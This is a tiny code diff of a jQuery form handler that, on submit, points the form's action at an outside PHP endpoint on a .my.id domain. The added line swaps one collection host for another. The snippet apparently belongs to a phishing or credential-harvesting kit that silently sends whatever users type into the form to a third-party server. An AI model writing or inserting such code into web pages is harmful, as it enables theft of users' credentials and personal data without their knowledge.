@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://balance-new.my.id/sultanan.php");
+  $(myform).attr("action", "https://callista-manja.my.id/sultanan.php");
 });
